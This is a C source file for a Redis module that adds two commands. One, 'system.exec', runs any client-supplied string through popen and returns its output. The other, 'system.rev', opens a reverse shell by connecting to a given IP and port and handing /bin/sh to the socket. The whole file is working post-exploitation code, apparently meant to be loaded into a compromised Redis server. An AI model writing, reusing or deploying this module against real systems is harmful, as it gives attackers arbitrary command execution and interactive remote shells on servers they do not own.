#include "redismodule.h"
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>
#include <arpa/inet.h>

int DoCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (argc == 2) {
        size_t cmd_len;
        const char *cmd = RedisModule_StringPtrLen(argv[1], &cmd_len);

        FILE *fp = popen(cmd, "r");
        if (!fp) {
            RedisModule_ReplyWithError(ctx, "ERR popen failed");
            return REDISMODULE_ERR;
        }

        char *output = NULL;
        size_t size = 0;
        char buf[1024];

        while (fgets(buf, sizeof(buf), fp) != NULL) {
            size_t buf_len = strlen(buf);
            char *new_output = realloc(output, size + buf_len + 1);
            if (!new_output) {
                free(output);
                pclose(fp);
                RedisModule_ReplyWithError(ctx, "ERR memory allocation failed");
                return REDISMODULE_ERR;
            }
            output = new_output;
            strcpy(output + size, buf);
            size += buf_len;
        }

        pclose(fp);

        if (output) {
            RedisModuleString *ret = RedisModule_CreateString(ctx, output, size);
            RedisModule_ReplyWithString(ctx, ret);
            free(output);
        } else {
            RedisModule_ReplyWithSimpleString(ctx, "");
        }
    } else {
        return RedisModule_WrongArity(ctx);
    }
    return REDISMODULE_OK;
}

int RevShellCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (argc == 3) {
        size_t cmd_len;
        const char *ip = RedisModule_StringPtrLen(argv[1], &cmd_len);
        const char *port_s = RedisModule_StringPtrLen(argv[2], &cmd_len);
        int port = atoi(port_s);
        int s;

        struct sockaddr_in sa;
        sa.sin_family = AF_INET;
        sa.sin_addr.s_addr = inet_addr(ip);
        sa.sin_port = htons(port);

        s = socket(AF_INET, SOCK_STREAM, 0);
        if (connect(s, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
            RedisModule_ReplyWithError(ctx, "ERR connection failed");
            close(s);
            return REDISMODULE_OK;
        }

        dup2(s, 0);
        dup2(s, 1);
        dup2(s, 2);

        char *args[] = {"/bin/sh", NULL};
        char *env[] = {NULL};
        execve("/bin/sh", args, env);
    }
    return RedisModule_WrongArity(ctx);
}

int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (RedisModule_Init(ctx, "system", 1, REDISMODULE_APIVER_1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;

    if (RedisModule_CreateCommand(ctx, "system.exec", DoCommand, "readonly", 1, 1, 1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;

    if (RedisModule_CreateCommand(ctx, "system.rev", RevShellCommand, "readonly", 1, 1, 1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;

    return REDISMODULE_OK;
}
